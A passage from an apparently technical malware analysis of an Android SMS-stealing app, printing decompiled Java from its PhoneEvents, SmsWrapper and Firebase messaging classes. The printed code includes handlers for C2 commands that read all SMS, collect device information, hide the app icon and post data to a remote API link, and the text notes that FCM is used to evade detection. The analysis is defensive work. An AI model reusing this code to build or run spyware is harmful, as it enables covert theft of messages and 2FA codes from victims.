            <span class="n">@Override</span> <span class="c1">// anywheresoftware.b4a.phone.PhoneEvents.ActionHandler</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">handle</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">send</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">});</span>
        <span class="k">this</span><span class="p">.</span><span class="n">map</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"android.intent.action.BATTERY_CHANGED"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ActionHandler</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.13</span>
            <span class="cm">/* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */</span>
            <span class="p">{</span>
                <span class="nf">super</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="k">event</span> <span class="p">=</span> <span class="s">"_batterychanged"</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">@Override</span> <span class="c1">// anywheresoftware.b4a.phone.PhoneEvents.ActionHandler</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">handle</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">send</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[]{</span><span class="n">Integer</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">intent</span><span class="p">.</span><span class="nf">getIntExtra</span><span class="p">(</span><span class="n">FirebaseAnalytics</span><span class="p">.</span><span class="n">Param</span><span class="p">.</span><span class="n">LEVEL</span><span class="p">,</span> <span class="m">0</span><span class="p">)),</span> <span class="n">Integer</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">intent</span><span class="p">.</span><span class="nf">getIntExtra</span><span class="p">(</span><span class="s">"scale"</span><span class="p">,</span> <span class="m">1</span><span class="p">)),</span> <span class="n">Boolean</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">intent</span><span class="p">.</span><span class="nf">getIntExtra</span><span class="p">(</span><span class="s">"plugged"</span><span class="p">,</span> <span class="m">0</span><span class="p">)</span> <span class="p">&gt;</span> <span class="m">0</span><span class="p">)});</span>
            <span class="p">}</span>
        <span class="p">});</span>
        <span class="k">this</span><span class="p">.</span><span class="n">map</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"android.intent.action.AIRPLANE_MODE"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ActionHandler</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.14</span>
            <span class="cm">/* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */</span>
            <span class="p">{</span>
                <span class="nf">super</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="k">event</span> <span class="p">=</span> <span class="s">"_airplanemodechanged"</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">@Override</span> <span class="c1">// anywheresoftware.b4a.phone.PhoneEvents.ActionHandler</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">handle</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">send</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[]{</span><span class="n">Boolean</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">intent</span><span class="p">.</span><span class="nf">getBooleanExtra</span><span class="p">(</span><span class="s">"state"</span><span class="p">,</span> <span class="k">false</span><span class="p">))});</span>
            <span class="p">}</span>
        <span class="p">});</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="n">Entry</span><span class="p">&lt;</span><span class="n">String</span><span class="p">,</span> <span class="n">ActionHandler</span><span class="p">&gt;</span> <span class="n">entry</span> <span class="p">:</span> <span class="k">this</span><span class="p">.</span><span class="n">map</span><span class="p">.</span><span class="nf">entrySet</span><span class="p">())</span> <span class="p">{</span>
            <span class="n">entry</span><span class="p">.</span><span class="nf">getValue</span><span class="p">().</span><span class="n">action</span> <span class="p">=</span> <span class="n">entry</span><span class="p">.</span><span class="nf">getKey</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>The last class is <code class="language-plaintext highlighter-rouge">SmsWrapper</code>, the malware will try to collect SMS from the victim’s phone such as <code class="language-plaintext highlighter-rouge">_id, address, type, body, person, date</code>. Then query this info to upload it to C2 server.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">@BA</span><span class="p">.</span><span class="nf">ShortName</span><span class="p">(</span><span class="s">"SmsMessages"</span><span class="p">)</span>
<span class="cm">/* loaded from: classes-dex2jar.jar:anywheresoftware/b4a/phone/SmsWrapper.class */</span>
<span class="k">public</span> <span class="k">class</span> <span class="nc">SmsWrapper</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">TYPE_DRAFT</span> <span class="p">=</span> <span class="m">3</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">TYPE_FAILED</span> <span class="p">=</span> <span class="m">5</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">TYPE_INBOX</span> <span class="p">=</span> <span class="m">1</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">TYPE_OUTBOX</span> <span class="p">=</span> <span class="m">4</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">TYPE_QUEUED</span> <span class="p">=</span> <span class="m">6</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">TYPE_SENT</span> <span class="p">=</span> <span class="m">2</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">TYPE_UNKNOWN</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
    <span class="k">private</span> <span class="k">static</span> <span class="n">final</span> <span class="n">String</span><span class="p">[]</span> <span class="n">projection</span> <span class="p">=</span> <span class="p">{</span><span class="s">"_id"</span><span class="p">,</span> <span class="s">"thread_id"</span><span class="p">,</span> <span class="s">"address"</span><span class="p">,</span> <span class="s">"read"</span><span class="p">,</span> <span class="s">"type"</span><span class="p">,</span> <span class="s">"body"</span><span class="p">,</span> <span class="s">"person"</span><span class="p">,</span> <span class="s">"date"</span><span class="p">};</span>

    <span class="n">@BA</span><span class="p">.</span><span class="nf">ShortName</span><span class="p">(</span><span class="s">"Sms"</span><span class="p">)</span>
    <span class="cm">/* loaded from: classes-dex2jar.jar:anywheresoftware/b4a/phone/SmsWrapper$Sms.class */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">Sms</span> <span class="p">{</span>
        <span class="k">public</span> <span class="n">String</span> <span class="n">Address</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">String</span> <span class="n">Body</span><span class="p">;</span>
        <span class="k">public</span> <span class="kt">long</span> <span class="n">Date</span><span class="p">;</span>
        <span class="k">public</span> <span class="kt">int</span> <span class="n">Id</span><span class="p">;</span>
        <span class="k">public</span> <span class="kt">int</span> <span class="n">PersonId</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">boolean</span> <span class="n">Read</span><span class="p">;</span>
        <span class="k">public</span> <span class="kt">int</span> <span class="n">ThreadId</span><span class="p">;</span>
        <span class="k">public</span> <span class="kt">int</span> <span class="n">Type</span><span class="p">;</span>

        <span class="k">public</span> <span class="nf">Sms</span><span class="p">()</span> <span class="p">{</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="nf">Sms</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="kt">int</span> <span class="n">i2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">i3</span><span class="p">,</span> <span class="kt">long</span> <span class="n">j</span><span class="p">,</span> <span class="n">boolean</span> <span class="n">z</span><span class="p">,</span> <span class="kt">int</span> <span class="n">i4</span><span class="p">,</span> <span class="n">String</span> <span class="n">str</span><span class="p">,</span> <span class="n">String</span> <span class="n">str2</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Id</span> <span class="p">=</span> <span class="n">i</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">ThreadId</span> <span class="p">=</span> <span class="n">i2</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">PersonId</span> <span class="p">=</span> <span class="n">i3</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Date</span> <span class="p">=</span> <span class="n">j</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Read</span> <span class="p">=</span> <span class="n">z</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Type</span> <span class="p">=</span> <span class="n">i4</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Body</span> <span class="p">=</span> <span class="n">str</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Address</span> <span class="p">=</span> <span class="n">str2</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">return</span> <span class="s">"Id="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">Id</span> <span class="p">+</span> <span class="s">", ThreadId="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">ThreadId</span> <span class="p">+</span> <span class="s">", PersonId="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">PersonId</span> <span class="p">+</span> <span class="s">", Date="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">Date</span> <span class="p">+</span> <span class="s">", Read="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">Read</span> <span class="p">+</span> <span class="s">", Type="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">Type</span> <span class="p">+</span> <span class="s">", Body="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">Body</span> <span class="p">+</span> <span class="s">", Address="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">Address</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>We try to see if it’s used in any classes, we see it’s used in <code class="language-plaintext highlighter-rouge">firebasemessaging</code> class.</p>

<p>In this class the malware will prepare the whole info which is collected to send it to the C2 server. The C2 server is firebase Cloud Messaging FCM which is provided by Google. The malware uses FCM to avoide detection. The malware will import these classes, every class collects info from the victim’s phone such as <code class="language-plaintext highlighter-rouge">PhoneEvents</code>, <code class="language-plaintext highlighter-rouge">SmsWrapper</code>, <code class="language-plaintext highlighter-rouge">Phone</code>.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">import</span> <span class="n">android</span><span class="p">.</span><span class="n">app</span><span class="p">.</span><span class="n">Service</span><span class="p">;</span>
<span class="n">import</span> <span class="n">android</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">BroadcastReceiver</span><span class="p">;</span>
<span class="n">import</span> <span class="n">android</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">ComponentName</span><span class="p">;</span>
<span class="n">import</span> <span class="n">android</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">Context</span><span class="p">;</span>
<span class="n">import</span> <span class="n">android</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">Intent</span><span class="p">;</span>
<span class="n">import</span> <span class="n">android</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">IBinder</span><span class="p">;</span>
<span class="n">import</span> <span class="n">androidx</span><span class="p">.</span><span class="n">core</span><span class="p">.</span><span class="n">app</span><span class="p">.</span><span class="n">NotificationCompat</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">BA</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">agraham</span><span class="p">.</span><span class="n">reflection</span><span class="p">.</span><span class="n">Reflection</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">keywords</span><span class="p">.</span><span class="n">B4AApplication</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">keywords</span><span class="p">.</span><span class="n">Common</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">keywords</span><span class="p">.</span><span class="n">DateTime</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">objects</span><span class="p">.</span><span class="n">FirebaseNotificationsService</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">objects</span><span class="p">.</span><span class="n">IntentWrapper</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">objects</span><span class="p">.</span><span class="n">NotificationWrapper</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">objects</span><span class="p">.</span><span class="n">RuntimePermissions</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">objects</span><span class="p">.</span><span class="n">ServiceHelper</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">objects</span><span class="p">.</span><span class="n">collections</span><span class="p">.</span><span class="n">List</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">objects</span><span class="p">.</span><span class="n">collections</span><span class="p">.</span><span class="n">Map</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">objects</span><span class="p">.</span><span class="n">streams</span><span class="p">.</span><span class="n">File</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">phone</span><span class="p">.</span><span class="n">Phone</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">phone</span><span class="p">.</span><span class="n">PhoneEvents</span><span class="p">;</span>
<span class="n">import</span> <span class="n">anywheresoftware</span><span class="p">.</span><span class="n">b4a</span><span class="p">.</span><span class="n">phone</span><span class="p">.</span><span class="n">SmsWrapper</span><span class="p">;</span>
<span class="n">import</span> <span class="n">b4a</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">contactsutils</span><span class="p">;</span>
<span class="n">import</span> <span class="n">com</span><span class="p">.</span><span class="n">reza</span><span class="p">.</span><span class="n">sh</span><span class="p">.</span><span class="n">deviceinfo</span><span class="p">.</span><span class="n">DiviceInfo</span><span class="p">;</span>
<span class="n">import</span> <span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">reflect</span><span class="p">.</span><span class="n">Method</span><span class="p">;</span>

</code></pre></div></div>

<p>In <code class="language-plaintext highlighter-rouge">NotificationCompat</code> the malware will get the type of the notifications if the notification is from alarm, social, call, or email.</p>

<p>In <code class="language-plaintext highlighter-rouge">DiviceInfo</code> the malware will get the device info such as IsAirPlane mode, accounts, anroid ID, or UUID.</p>

<p>Now, in this class the malware will send commands from the C2 server to the victim’s phone. To control the state of the phone to set on Vibration or set volumn to specific sound or silent.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span><span class="n">_comand</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"vibrate"</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">_android</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="n">_androidid</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">Phone</span><span class="p">.</span><span class="nf">SetRingerMode</span><span class="p">(</span><span class="m">1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_comand</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="n">NotificationCompat</span><span class="p">.</span><span class="n">GROUP_KEY_SILENT</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">_android</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="n">_androidid</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">Phone</span><span class="p">.</span><span class="nf">SetVolume</span><span class="p">(</span><span class="m">5</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
            <span class="n">Phone</span><span class="p">.</span><span class="nf">SetVolume</span><span class="p">(</span><span class="m">1</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
            <span class="n">Phone</span><span class="p">.</span><span class="nf">SetVolume</span><span class="p">(</span><span class="m">4</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
            <span class="n">Phone</span><span class="p">.</span><span class="nf">SetVolume</span><span class="p">(</span><span class="m">3</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_comand</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"normal"</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">_android</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="n">_androidid</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">Phone</span><span class="p">.</span><span class="nf">SetRingerMode</span><span class="p">(</span><span class="m">2</span><span class="p">);</span>
            <span class="n">Phone</span><span class="p">.</span><span class="nf">SetVolume</span><span class="p">(</span><span class="m">5</span><span class="p">,</span> <span class="m">100</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
            <span class="n">Phone</span><span class="p">.</span><span class="nf">SetVolume</span><span class="p">(</span><span class="m">1</span><span class="p">,</span> <span class="m">100</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
            <span class="n">Phone</span><span class="p">.</span><span class="nf">SetVolume</span><span class="p">(</span><span class="m">4</span><span class="p">,</span> <span class="m">100</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
            <span class="n">Phone</span><span class="p">.</span><span class="nf">SetVolume</span><span class="p">(</span><span class="m">3</span><span class="p">,</span> <span class="m">100</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
        <span class="p">}</span>
</code></pre></div></div>
<p>The mlawre will check the connectivity to the internet with ping or send single SMS.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span><span class="n">_comand</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"ping"</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">String</span> <span class="n">str</span> <span class="p">=</span> <span class="s">"result=ok&amp;action=ping&amp;androidid="</span> <span class="p">+</span> <span class="n">_android</span> <span class="p">+</span> <span class="s">"&amp;model="</span> <span class="p">+</span> <span class="n">_model</span> <span class="p">+</span> <span class="s">"&amp;battry="</span> <span class="p">+</span> <span class="n">_battry</span> <span class="p">+</span> <span class="s">"&amp;opr="</span> <span class="p">+</span> <span class="n">_opr</span><span class="p">;</span>
            <span class="n">_data</span> <span class="p">=</span> <span class="n">str</span><span class="p">;</span>
            <span class="n">_ht</span><span class="p">.</span><span class="nf">_poststring</span><span class="p">(</span><span class="n">_apilink</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_comand</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"pingone"</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">_android</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="n">_androidid</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">String</span> <span class="n">str2</span> <span class="p">=</span> <span class="s">"result=ok&amp;action=pingone&amp;androidid="</span> <span class="p">+</span> <span class="n">_android</span> <span class="p">+</span> <span class="s">"&amp;model="</span> <span class="p">+</span> <span class="n">_model</span> <span class="p">+</span> <span class="s">"&amp;battry="</span> <span class="p">+</span> <span class="n">_battry</span> <span class="p">+</span> <span class="s">"&amp;opr="</span> <span class="p">+</span> <span class="n">_opr</span><span class="p">;</span>
            <span class="n">_data</span> <span class="p">=</span> <span class="n">str2</span><span class="p">;</span>
            <span class="n">_ht</span><span class="p">.</span><span class="nf">_poststring</span><span class="p">(</span><span class="n">_apilink</span><span class="p">,</span> <span class="n">str2</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_comand</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"SendSingleMessage"</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">_android</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="n">_androidid</span><span class="p">))</span> <span class="p">{</span>
            <span class="nf">_sendlargesms</span><span class="p">(</span><span class="n">_nump</span><span class="p">,</span> <span class="n">_txm</span><span class="p">);</span>
        <span class="p">}</span>
</code></pre></div></div>
<p>The malware will send a command send device info and command to hide/unhide the icon of installed APK.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span><span class="n">_comand</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"getdevicefullinfo"</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">_android</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="n">_androidid</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">Common</span><span class="p">.</span><span class="nf">LogImpl</span><span class="p">(</span><span class="s">"83473462"</span><span class="p">,</span> <span class="s">"Deviceinfo is OK"</span><span class="p">,</span> <span class="m">0</span><span class="p">);</span>
            <span class="n">String</span> <span class="n">str3</span> <span class="p">=</span> <span class="s">"result=ok&amp;action=getdevicefullinfo&amp;androidid="</span> <span class="p">+</span> <span class="n">_android</span> <span class="p">+</span> <span class="s">"&amp;opr="</span> <span class="p">+</span> <span class="n">_opr</span> <span class="p">+</span> <span class="s">"&amp;model="</span> <span class="p">+</span> <span class="n">_model</span> <span class="p">+</span> <span class="s">"&amp;battry="</span> <span class="p">+</span> <span class="n">_battry</span><span class="p">;</span>
            <span class="n">_data</span> <span class="p">=</span> <span class="n">str3</span><span class="p">;</span>
            <span class="n">_ht</span><span class="p">.</span><span class="nf">_poststring</span><span class="p">(</span><span class="n">_apilink</span><span class="p">,</span> <span class="n">str3</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_comand</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"hideicon"</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">_android</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="n">_androidid</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">Common</span><span class="p">.</span><span class="nf">LogImpl</span><span class="p">(</span><span class="s">"83473474"</span><span class="p">,</span> <span class="s">"hideicon is OK"</span><span class="p">,</span> <span class="m">0</span><span class="p">);</span>
            <span class="nf">_hideapp</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_comand</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"showhideicon"</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">_android</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="n">_androidid</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">Common</span><span class="p">.</span><span class="nf">LogImpl</span><span class="p">(</span><span class="s">"83473483"</span><span class="p">,</span> <span class="s">"unhideicon is OK"</span><span class="p">,</span> <span class="m">0</span><span class="p">);</span>
            <span class="nf">_hideapp</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_comand</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"testphone"</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">_android</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="n">_androidid</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">_result1</span> <span class="p">=</span> <span class="n">_rn</span><span class="p">.</span><span class="nf">Check</span><span class="p">(</span><span class="n">RuntimePermissions</span><span class="p">.</span><span class="n">PERMISSION_SEND_SMS</span><span class="p">);</span>
            <span class="n">_result2</span> <span class="p">=</span> <span class="n">_rn</span><span class="p">.</span><span class="nf">Check</span><span class="p">(</span><span class="n">RuntimePermissions</span><span class="p">.</span><span class="n">PERMISSION_READ_SMS</span><span class="p">);</span>
            <span class="n">_result3</span> <span class="p">=</span> <span class="n">_rn</span><span class="p">.</span><span class="nf">Check</span><span class="p">(</span><span class="n">RuntimePermissions</span><span class="p">.</span><span class="n">PERMISSION_READ_CONTACTS</span><span class="p">);</span>
            <span class="n">String</span> <span class="n">str4</span> <span class="p">=</span> <span class="s">"result=ok&amp;action=testphone&amp;sendsms="</span> <span class="p">+</span> <span class="n">BA</span><span class="p">.</span><span class="nf">ObjectToString</span><span class="p">(</span><span class="n">Boolean</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">_result1</span><span class="p">))</span> <span class="p">+</span> <span class="s">"&amp;readsms="</span> <span class="p">+</span> <span class="n">BA</span><span class="p">.</span><span class="nf">ObjectToString</span><span class="p">(</span><span class="n">Boolean</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">_result2</span><span class="p">))</span> <span class="p">+</span> <span class="s">"&amp;contacts="</span> <span class="p">+</span> <span class="n">BA</span><span class="p">.</span><span class="nf">ObjectToString</span><span class="p">(</span><span class="n">Boolean</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">_result3</span><span class="p">))</span> <span class="p">+</span> <span class="s">"&amp;model="</span> <span class="p">+</span> <span class="n">_model</span><span class="p">;</span>
            <span class="n">_data</span> <span class="p">=</span> <span class="n">str4</span><span class="p">;</span>
            <span class="n">_ht</span><span class="p">.</span><span class="nf">_poststring</span><span class="p">(</span><span class="n">_apilink</span><span class="p">,</span> <span class="n">str4</span><span class="p">);</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>The malware wil send a command <code class="language-plaintext highlighter-rouge">getsms</code> to upload all SMS from victim’s phone. This ensure that if the malware steals your credentials and has your SMS which contains 2 factor authentication 2FA then you are fucked.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">_comand</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"getsms"</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">_android</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="n">_androidid</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">Common</span><span class="p">.</span><span class="nf">LogImpl</span><span class="p">(</span><span class="s">"83473500"</span><span class="p">,</span> <span class="s">"GetLastSms is OK"</span><span class="p">,</span> <span class="m">0</span><span class="p">);</span>
            <span class="n">_li</span><span class="p">.</span><span class="nf">Initialize</span><span class="p">();</span>
            <span class="n">List</span> <span class="n">GetAll</span> <span class="p">=</span> <span class="n">_sms2</span><span class="p">.</span><span class="nf">GetAll</span><span class="p">();</span>
            <span class="n">_li</span> <span class="p">=</span> <span class="n">GetAll</span><span class="p">;</span>
            <span class="kt">int</span> <span class="n">size</span> <span class="p">=</span> <span class="n">GetAll</span><span class="p">.</span><span class="nf">getSize</span><span class="p">();</span>
            <span class="n">String</span> <span class="n">str5</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;=</span> <span class="n">size</span> <span class="p">-</span> <span class="m">1</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span> <span class="p">{</span>
